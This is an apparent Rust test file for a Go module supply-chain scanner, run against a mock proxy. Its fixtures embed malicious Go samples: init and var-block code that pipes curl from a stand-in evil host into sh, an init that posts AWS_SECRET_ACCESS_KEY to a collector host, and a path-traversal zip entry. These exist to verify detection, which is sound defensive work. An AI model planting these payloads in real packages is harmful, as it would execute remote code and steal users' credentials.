//! End-to-end tests for `fetch_and_scan_go` via MockTransport.
//!
//! No network is touched: the mock serves the GOPROXY `@v/list`, `@latest`,
//! `.zip`, and `.ziphash` routes. The `.ziphash` value is the real dirhash `h1:`
//! recomputed over the same zip the test builds, so the integrity path is
//! exercised honestly: a *mismatched* checksum hard-errors, while a *missing*
//! `.ziphash` route (not a mandated GOPROXY endpoint) degrades to a visible
//! `go-integrity-unverified` finding rather than aborting the scan.

use argus_core::Decision;
use argus_go::dirhash::compute_h1;
use argus_go::{fetch_and_scan_go, GoFetchOptions, GoModuleRef};
use argus_test_support::MockTransport;
use std::io::Write;

const REGISTRY: &str = "https://mock.proxy";

/// Build a Go module `.zip`. Every entry is prefixed
/// `<module>@<version>/` per Go's module zip layout. `files` is a list of
/// (path-under-module-root, body) pairs.
fn make_module_zip(module: &str, version: &str, files: &[(&str, &[u8])]) -> Vec<u8> {
    let mut buf = Vec::new();
    {
        let mut writer = zip::ZipWriter::new(std::io::Cursor::new(&mut buf));
        let opts: zip::write::FileOptions<()> =
            zip::write::FileOptions::default().compression_method(zip::CompressionMethod::Deflated);
        let prefix = format!("{module}@{version}");
        for (path, body) in files {
            writer.start_file(format!("{prefix}/{path}"), opts).unwrap();
            writer.write_all(body).unwrap();
        }
        writer.finish().unwrap();
    }
    buf
}

/// Recompute the dirhash h1 over the same logical file set the zip
/// carries, so the `.ziphash` route serves a value that matches the real
/// extracted bytes.
fn h1_for(module: &str, version: &str, files: &[(&str, &[u8])]) -> String {
    let prefix = format!("{module}@{version}");
    let pairs: Vec<(String, Vec<u8>)> = files
        .iter()
        .map(|(p, b)| (format!("{prefix}/{p}"), b.to_vec()))
        .collect();
    compute_h1(&pairs)
}

fn register(
    transport: &MockTransport,
    module: &str,
    version: &str,
    zip: Vec<u8>,
    ziphash: Option<String>,
) {
    transport.insert(&format!("{REGISTRY}/{module}/@v/{version}.zip"), zip);
    if let Some(h) = ziphash {
        transport.insert(
            &format!("{REGISTRY}/{module}/@v/{version}.ziphash"),
            h.into_bytes(),
        );
    }
}

fn opts() -> GoFetchOptions {
    GoFetchOptions {
        registry: REGISTRY.to_string(),
        ..GoFetchOptions::default()
    }
}

#[test]
fn malicious_init_exec_blocks() {
    let module = "example.com/evilmod";
    let version = "v1.0.0";
    let go_mod = b"module example.com/evilmod\n\ngo 1.21\n";
    let main_go = br#"
package evilmod

import "os/exec"

func init() {
    exec.Command("sh", "-c", "curl http://evil.example.invalid|sh").Run()
}
"#;
    let files: &[(&str, &[u8])] = &[("go.mod", go_mod), ("evil.go", main_go)];
    let zip = make_module_zip(module, version, files);
    let h1 = h1_for(module, version, files);

    let transport = MockTransport::new();
    register(&transport, module, version, zip, Some(h1));

    let pkg = GoModuleRef::parse(&format!("{module}@{version}")).unwrap();
    let report = fetch_and_scan_go(&pkg, &opts(), &transport).unwrap();

    let rule_ids: Vec<&str> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(rule_ids.contains(&"go-init-function"), "got: {rule_ids:?}");
    assert!(rule_ids.contains(&"go-init-exec"), "got: {rule_ids:?}");
    assert_eq!(report.decision, Decision::Block);
}

#[test]
fn clean_library_allows() {
    let module = "example.com/cleanmod";
    let version = "v1.2.3";
    let go_mod = b"module example.com/cleanmod\n\ngo 1.21\n";
    let lib_go = b"package cleanmod\n\nfunc Add(a, b int) int { return a + b }\n";
    let util_go = b"package cleanmod\n\nfunc Mul(a, b int) int { return a * b }\n";
    let files: &[(&str, &[u8])] = &[("go.mod", go_mod), ("lib.go", lib_go), ("util.go", util_go)];
    let zip = make_module_zip(module, version, files);
    let h1 = h1_for(module, version, files);

    let transport = MockTransport::new();
    register(&transport, module, version, zip, Some(h1));

    let pkg = GoModuleRef::parse(&format!("{module}@{version}")).unwrap();
    let report = fetch_and_scan_go(&pkg, &opts(), &transport).unwrap();

    assert!(
        report.findings.is_empty(),
        "expected no findings, got: {:?}",
        report.findings
    );
    assert_eq!(report.decision, Decision::Allow);
}

#[test]
fn init_present_but_benign_is_info_only_allow() {
    let module = "example.com/drivermod";
    let version = "v0.1.0";
    let go_mod = b"module example.com/drivermod\n\ngo 1.21\n";
    let reg_go = br#"
package drivermod

func registerDriver() {}

func init() {
    registerDriver()
}
"#;
    let files: &[(&str, &[u8])] = &[("go.mod", go_mod), ("reg.go", reg_go)];
    let zip = make_module_zip(module, version, files);
    let h1 = h1_for(module, version, files);

    let transport = MockTransport::new();
    register(&transport, module, version, zip, Some(h1));

    let pkg = GoModuleRef::parse(&format!("{module}@{version}")).unwrap();
    let report = fetch_and_scan_go(&pkg, &opts(), &transport).unwrap();

    let rule_ids: Vec<&str> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(rule_ids.contains(&"go-init-function"), "got: {rule_ids:?}");
    // Only the Info structural finding fired — it must NOT block.
    assert!(!rule_ids.contains(&"go-init-exec"), "got: {rule_ids:?}");
    assert!(!rule_ids.contains(&"go-init-network"), "got: {rule_ids:?}");
    assert_eq!(report.decision, Decision::Allow);
}

#[test]
fn integrity_match_succeeds() {
    let module = "example.com/intmod";
    let version = "v1.0.0";
    let files: &[(&str, &[u8])] = &[
        ("go.mod", b"module example.com/intmod\n\ngo 1.21\n"),
        ("x.go", b"package intmod\nfunc X() {}\n"),
    ];
    let zip = make_module_zip(module, version, files);
    let h1 = h1_for(module, version, files);

    let transport = MockTransport::new();
    register(&transport, module, version, zip, Some(h1));

    let pkg = GoModuleRef::parse(&format!("{module}@{version}")).unwrap();
    let report = fetch_and_scan_go(&pkg, &opts(), &transport).unwrap();
    assert_eq!(report.decision, Decision::Allow);
    assert_eq!(report.package_version.as_deref(), Some(version));
}

#[test]
fn integrity_mismatch_hard_errors() {
    let module = "example.com/intmod";
    let version = "v1.0.0";
    let files: &[(&str, &[u8])] = &[
        ("go.mod", b"module example.com/intmod\n\ngo 1.21\n"),
        ("x.go", b"package intmod\nfunc X() {}\n"),
    ];
    let zip = make_module_zip(module, version, files);
    // Serve a syntactically valid but WRONG h1.
    let bad_h1 = "h1:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=".to_string();

    let transport = MockTransport::new();
    register(&transport, module, version, zip, Some(bad_h1));

    let pkg = GoModuleRef::parse(&format!("{module}@{version}")).unwrap();
    let err = format!(
        "{:#}",
        fetch_and_scan_go(&pkg, &opts(), &transport).unwrap_err()
    );
    assert!(
        err.contains("checksum mismatch") || err.contains("h1"),
        "got: {err}"
    );
}

#[test]
fn ziphash_endpoint_missing_is_unverified_not_fatal() {
    let module = "example.com/intmod";
    let version = "v1.0.0";
    let files: &[(&str, &[u8])] = &[
        ("go.mod", b"module example.com/intmod\n\ngo 1.21\n"),
        ("x.go", b"package intmod\nfunc X() {}\n"),
    ];
    let zip = make_module_zip(module, version, files);

    let transport = MockTransport::new();
    // Register the zip but NOT the .ziphash route. A compliant GOPROXY is only
    // required to serve list/latest/info/mod/zip, so a missing .ziphash must
    // NOT abort the scan — integrity is surfaced as `go-integrity-unverified`
    // (never silently skipped, U-29) and the clean module still resolves.
    register(&transport, module, version, zip, None);

    let pkg = GoModuleRef::parse(&format!("{module}@{version}")).unwrap();
    let report = fetch_and_scan_go(&pkg, &opts(), &transport).unwrap();
    let rule_ids: Vec<&str> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(
        rule_ids.contains(&"go-integrity-unverified"),
        "got: {rule_ids:?}"
    );
    // The unverified Info finding must not block a clean module on its own.
    assert_eq!(report.decision, Decision::Allow);
}

#[test]
fn ziphash_endpoint_gone_is_unverified_not_fatal() -> anyhow::Result<()> {
    let module = "example.com/gonemod";
    let version = "v1.0.0";
    let files: &[(&str, &[u8])] = &[
        ("go.mod", b"module example.com/gonemod\n\ngo 1.21\n"),
        ("x.go", b"package gonemod\nfunc X() {}\n"),
    ];
    let zip = make_module_zip(module, version, files);

    let transport = MockTransport::new();
    register(&transport, module, version, zip, None);
    transport.insert_status(&format!("{REGISTRY}/{module}/@v/{version}.ziphash"), 410);

    let pkg = GoModuleRef::parse(&format!("{module}@{version}"))?;
    let report = fetch_and_scan_go(&pkg, &opts(), &transport)?;
    let rule_ids: Vec<&str> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(
        rule_ids.contains(&"go-integrity-unverified"),
        "got: {rule_ids:?}"
    );
    assert_eq!(report.decision, Decision::Allow);
    Ok(())
}

#[test]
fn ziphash_redirect_to_external_404_is_not_treated_as_missing() {
    let module = "example.com/redirecthash";
    let version = "v1.0.0";
    let files: &[(&str, &[u8])] = &[
        ("go.mod", b"module example.com/redirecthash\n\ngo 1.21\n"),
        ("x.go", b"package redirecthash\nfunc X() {}\n"),
    ];
    let zip = make_module_zip(module, version, files);
    let ziphash_url = format!("{REGISTRY}/{module}/@v/{version}.ziphash");
    let evil_ziphash = "https://evil.example.invalid/redirecthash.ziph";

    let transport = MockTransport::new();
    register(&transport, module, version, zip, None);
    transport.insert_redirect(&ziphash_url, evil_ziphash);
    transport.insert_status(evil_ziphash, 404);

    let pkg = GoModuleRef::parse(&format!("{module}@{version}")).unwrap();
    let err = format!(
        "{:#}",
        fetch_and_scan_go(&pkg, &opts(), &transport).unwrap_err()
    );
    assert!(err.contains("allowlist"), "got: {err}");
    assert_eq!(
        transport.request_count(evil_ziphash),
        0,
        "disallowed ziphash redirect target must not be requested or treated as missing"
    );
}

#[test]
fn mismatched_ziphash_still_hard_errors() {
    // A *present* .ziphash that does not match the recomputed h1 is tamper
    // and must hard-fail (this is the path the missing-route change must NOT
    // weaken).
    let module = "example.com/tampermod";
    let version = "v1.0.0";
    let files: &[(&str, &[u8])] = &[
        ("go.mod", b"module example.com/tampermod\n\ngo 1.21\n"),
        ("x.go", b"package tampermod\nfunc X() {}\n"),
    ];
    let zip = make_module_zip(module, version, files);

    let transport = MockTransport::new();
    register(
        &transport,
        module,
        version,
        zip,
        Some("h1:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=".to_string()),
    );

    let pkg = GoModuleRef::parse(&format!("{module}@{version}")).unwrap();
    let err = format!(
        "{:#}",
        fetch_and_scan_go(&pkg, &opts(), &transport).unwrap_err()
    );
    assert!(err.contains("checksum mismatch"), "got: {err}");
}

#[test]
fn var_block_init_exec_blocks() {
    // A grouped `var ( ... )` block initializer runs at import; an os/exec
    // call inside it must still escalate to go-init-exec (the single-line
    // var regex alone would miss the block form).
    let module = "example.com/varmod";
    let version = "v1.0.0";
    let go_mod = b"module example.com/varmod\n\ngo 1.21\n";
    let src = br#"
package varmod

import "os/exec"

var (
    _ = exec.Command("sh", "-c", "curl http://evil.example.invalid|sh").Run()
)
"#;
    let files: &[(&str, &[u8])] = &[("go.mod", go_mod), ("v.go", src)];
    let zip = make_module_zip(module, version, files);
    let h1 = h1_for(module, version, files);

    let transport = MockTransport::new();
    register(&transport, module, version, zip, Some(h1));

    let pkg = GoModuleRef::parse(&format!("{module}@{version}")).unwrap();
    let report = fetch_and_scan_go(&pkg, &opts(), &transport).unwrap();
    let ids: Vec<&str> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"go-package-var-exec"), "got: {ids:?}");
    assert!(ids.contains(&"go-init-exec"), "got: {ids:?}");
    assert_eq!(report.decision, Decision::Block);
}

#[test]
fn aliased_os_exec_import_blocks() {
    // os/exec imported under an alias: calls appear as `e.Command(...)`, which
    // the plain `exec.Command` regex misses. detect_exec_call must still fire.
    let module = "example.com/aliasmod";
    let version = "v1.0.0";
    let go_mod = b"module example.com/aliasmod\n\ngo 1.21\n";
    let src = br#"
package aliasmod

import e "os/exec"

func init() {
    e.Command("sh", "-c", "id").Run()
}
"#;
    let files: &[(&str, &[u8])] = &[("go.mod", go_mod), ("a.go", src)];
    let zip = make_module_zip(module, version, files);
    let h1 = h1_for(module, version, files);

    let transport = MockTransport::new();
    register(&transport, module, version, zip, Some(h1));

    let pkg = GoModuleRef::parse(&format!("{module}@{version}")).unwrap();
    let report = fetch_and_scan_go(&pkg, &opts(), &transport).unwrap();
    let ids: Vec<&str> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"go-init-exec"), "got: {ids:?}");
    assert_eq!(report.decision, Decision::Block);
}

#[test]
fn host_allowlist_rejects_cross_host_artifact_url() {
    // The host allowlist is empty for Go (the proxy serves zip + metadata
    // from one host), so an artifact URL on a foreign host must be
    // rejected outright. This exercises the same `validate_artifact_url`
    // gate `fetch_and_scan_go` runs before any download. (The orchestrator
    // builds zip URLs from the registry host, so a cross-host URL can only
    // arise from a malicious redirect / crafted URL — which this rejects.)
    use argus_core::url::validate_artifact_url;
    let foreign: &[&str] = &[];
    let err = validate_artifact_url(
        "https://evil.example.invalid/example.com/m/@v/v1.0.0.zip",
        "proxy.golang.org",
        foreign,
    )
    .unwrap_err()
    .to_string();
    assert!(err.contains("evil.example.invalid"), "got: {err}");
}

#[test]
fn ziphash_redirect_to_external_200_is_not_downgraded_to_unverified() {
    let module = "example.com/redirecthash";
    let version = "v1.0.0";
    let files: &[(&str, &[u8])] = &[
        ("go.mod", b"module example.com/redirecthash\n\ngo 1.21\n"),
        (
            "lib.go",
            b"package redirecthash\nfunc Add(a, b int) int { return a + b }\n",
        ),
    ];
    let zip = make_module_zip(module, version, files);
    let h1 = h1_for(module, version, files);
    let ziphash_url = format!("{REGISTRY}/{module}/@v/{version}.ziphash");
    let evil_url = "https://evil.example.invalid/redirecthash.ziphash";

    let transport = MockTransport::new();
    transport.insert(&format!("{REGISTRY}/{module}/@v/{version}.zip"), zip);
    transport.insert_redirect(&ziphash_url, evil_url);
    transport.insert(evil_url, h1.into_bytes());

    let pkg = GoModuleRef::parse(&format!("{module}@{version}")).unwrap();
    let err = format!(
        "{:#}",
        fetch_and_scan_go(&pkg, &opts(), &transport).unwrap_err()
    );
    assert!(err.contains("allowlist"), "got: {err}");
    assert_eq!(
        transport.request_count(evil_url),
        0,
        "disallowed ziphash redirect target must not be requested"
    );
}

#[test]
fn ziphash_redirect_to_external_404_is_not_treated_as_absent_ziphash() {
    let module = "example.com/redirecthash404";
    let version = "v1.0.0";
    let files: &[(&str, &[u8])] = &[
        ("go.mod", b"module example.com/redirecthash404\n\ngo 1.21\n"),
        (
            "lib.go",
            b"package redirecthash404\nfunc Add(a, b int) int { return a + b }\n",
        ),
    ];
    let zip = make_module_zip(module, version, files);
    let ziphash_url = format!("{REGISTRY}/{module}/@v/{version}.ziphash");
    let evil_url = "https://evil.example.invalid/redirecthash.ziphash";

    let transport = MockTransport::new();
    transport.insert(&format!("{REGISTRY}/{module}/@v/{version}.zip"), zip);
    transport.insert_redirect(&ziphash_url, evil_url);
    transport.insert_status(evil_url, 404);

    let pkg = GoModuleRef::parse(&format!("{module}@{version}")).unwrap();
    let err = format!(
        "{:#}",
        fetch_and_scan_go(&pkg, &opts(), &transport).unwrap_err()
    );
    assert!(err.contains("allowlist"), "got: {err}");
    assert_eq!(
        transport.request_count(evil_url),
        0,
        "disallowed ziphash redirect target must not be requested or classified as a 404"
    );
}

#[test]
fn path_escape_zip_entry_is_rejected() {
    // A zip whose entry name traverses parent dirs must be refused by the
    // copied wheel.rs ParentDir guard before any scan happens.
    let mut buf = Vec::new();
    {
        let mut writer = zip::ZipWriter::new(std::io::Cursor::new(&mut buf));
        let opts: zip::write::FileOptions<()> = zip::write::FileOptions::default();
        // Deliberately unsafe traversal name.
        writer.start_file("../escaped.go", opts).unwrap();
        writer.write_all(b"package m\n").unwrap();
        writer.finish().unwrap();
    }

    let err = format!(
        "{:#}",
        argus_go::extract_module_zip(&buf, 1024 * 1024).unwrap_err()
    );
    assert!(
        err.contains("unsafe path") || err.contains("parent dir"),
        "got: {err}"
    );
}

#[test]
fn typosquat_blocks() {
    // Clean source, but the module path is one edit from sirupsen/logrus.
    let module = "github.com/sirupsen/logruss";
    let version = "v1.0.0";
    let files: &[(&str, &[u8])] = &[
        ("go.mod", b"module github.com/sirupsen/logruss\n\ngo 1.21\n"),
        ("log.go", b"package logruss\nfunc Info() {}\n"),
    ];
    let zip = make_module_zip(module, version, files);
    let h1 = h1_for(module, version, files);

    let transport = MockTransport::new();
    register(&transport, module, version, zip, Some(h1));

    let pkg = GoModuleRef::parse(&format!("{module}@{version}")).unwrap();
    let report = fetch_and_scan_go(&pkg, &opts(), &transport).unwrap();

    let rule_ids: Vec<&str> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(rule_ids.contains(&"typosquatting"), "got: {rule_ids:?}");
    assert!(rule_ids.contains(&"low-reputation"), "got: {rule_ids:?}");
    assert_eq!(report.decision, Decision::Block);
}

#[test]
fn resolve_latest_via_v_list_when_no_at_latest() {
    // A compliant private GOPROXY may serve @v/list + info/mod/zip but NOT
    // @latest. When the user omits a version, resolution must read @v/list
    // (unsorted, plain text) and pick the highest release — here v1.10.0,
    // NOT the lexically-largest v1.9.0.
    let module = "example.com/listmod";
    let version = "v1.10.0";
    let go_mod = b"module example.com/listmod\n\ngo 1.21\n";
    let lib_go = b"package listmod\n\nfunc Add(a, b int) int { return a + b }\n";
    let files: &[(&str, &[u8])] = &[("go.mod", go_mod), ("lib.go", lib_go)];
    let zip = make_module_zip(module, version, files);
    let h1 = h1_for(module, version, files);

    let transport = MockTransport::new();
    // Unsorted version list; no @latest route registered.
    transport.insert(
        &format!("{REGISTRY}/{module}/@v/list"),
        b"v1.2.0\nv1.10.0\nv1.9.0\n".to_vec(),
    );
    register(&transport, module, version, zip, Some(h1));

    // Spec form WITHOUT a version (parse yields version: None).
    let pkg = GoModuleRef::parse(module).unwrap();
    let report = fetch_and_scan_go(&pkg, &opts(), &transport).unwrap();
    assert_eq!(report.package_version.as_deref(), Some("v1.10.0"));
    assert_eq!(report.decision, Decision::Allow);
}

#[test]
fn resolve_latest_via_at_latest_when_no_v_list() {
    // The existing @latest path must keep working: when @v/list is absent
    // (not registered), resolution falls back to the optional @latest JSON.
    let module = "example.com/latestmod";
    let version = "v2.0.0";
    let go_mod = b"module example.com/latestmod\n\ngo 1.21\n";
    let lib_go = b"package latestmod\n\nfunc Add(a, b int) int { return a + b }\n";
    let files: &[(&str, &[u8])] = &[("go.mod", go_mod), ("lib.go", lib_go)];
    let zip = make_module_zip(module, version, files);
    let h1 = h1_for(module, version, files);

    let transport = MockTransport::new();
    // No @v/list route; only @latest is available.
    transport.insert(
        &format!("{REGISTRY}/{module}/@latest"),
        format!(r#"{{"Version":"{version}"}}"#).into_bytes(),
    );
    register(&transport, module, version, zip, Some(h1));

    let pkg = GoModuleRef::parse(module).unwrap();
    let report = fetch_and_scan_go(&pkg, &opts(), &transport).unwrap();
    assert_eq!(report.package_version.as_deref(), Some(version));
    assert_eq!(report.decision, Decision::Allow);
}

#[test]
fn init_holding_http_client_is_not_network_egress() {
    // An init() that only constructs/holds an http.Client (no actual request)
    // must NOT produce a Critical go-init-network finding. Previously the bare
    // `http.Client` type matched the network regex and blocked benign code.
    let module = "example.com/clientmod";
    let version = "v1.0.0";
    let go_mod = b"module example.com/clientmod\n\ngo 1.21\n";
    let src = br#"
package clientmod

import "net/http"

var c = &http.Client{}

func init() {
    _ = c
}
"#;
    let files: &[(&str, &[u8])] = &[("go.mod", go_mod), ("client.go", src)];
    let zip = make_module_zip(module, version, files);
    let h1 = h1_for(module, version, files);

    let transport = MockTransport::new();
    register(&transport, module, version, zip, Some(h1));

    let pkg = GoModuleRef::parse(&format!("{module}@{version}")).unwrap();
    let report = fetch_and_scan_go(&pkg, &opts(), &transport).unwrap();
    let ids: Vec<&str> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(!ids.contains(&"go-init-network"), "got: {ids:?}");
    assert_eq!(report.decision, Decision::Allow);
}

#[test]
fn init_with_real_http_get_still_blocks() {
    // The complement to the http.Client false-positive test: a real
    // http.Get(...) inside init() must still escalate to go-init-network.
    let module = "example.com/getmod";
    let version = "v1.0.0";
    let go_mod = b"module example.com/getmod\n\ngo 1.21\n";
    let src = br#"
package getmod

import "net/http"

func init() {
    http.Get("https://collect.example.invalid")
}
"#;
    let files: &[(&str, &[u8])] = &[("go.mod", go_mod), ("get.go", src)];
    let zip = make_module_zip(module, version, files);
    let h1 = h1_for(module, version, files);

    let transport = MockTransport::new();
    register(&transport, module, version, zip, Some(h1));

    let pkg = GoModuleRef::parse(&format!("{module}@{version}")).unwrap();
    let report = fetch_and_scan_go(&pkg, &opts(), &transport).unwrap();
    let ids: Vec<&str> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"go-init-network"), "got: {ids:?}");
    assert_eq!(report.decision, Decision::Block);
}

#[test]
fn init_network_env_exfil_blocks() {
    let module = "example.com/exfilmod";
    let version = "v1.0.0";
    let go_mod = b"module example.com/exfilmod\n\ngo 1.21\n";
    let exfil_go = br#"
package exfilmod

import (
    "net/http"
    "os"
    "strings"
)

func init() {
    secret := os.Getenv("AWS_SECRET_ACCESS_KEY")
    http.Post("https://collect.example.invalid", "text/plain", strings.NewReader(secret))
}
"#;
    let files: &[(&str, &[u8])] = &[("go.mod", go_mod), ("exfil.go", exfil_go)];
    let zip = make_module_zip(module, version, files);
    let h1 = h1_for(module, version, files);

    let transport = MockTransport::new();
    register(&transport, module, version, zip, Some(h1));

    let pkg = GoModuleRef::parse(&format!("{module}@{version}")).unwrap();
    let report = fetch_and_scan_go(&pkg, &opts(), &transport).unwrap();

    let rule_ids: Vec<&str> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(rule_ids.contains(&"go-init-network"), "got: {rule_ids:?}");
    assert!(rule_ids.contains(&"go-init-env-exfil"), "got: {rule_ids:?}");
    assert_eq!(report.decision, Decision::Block);
}
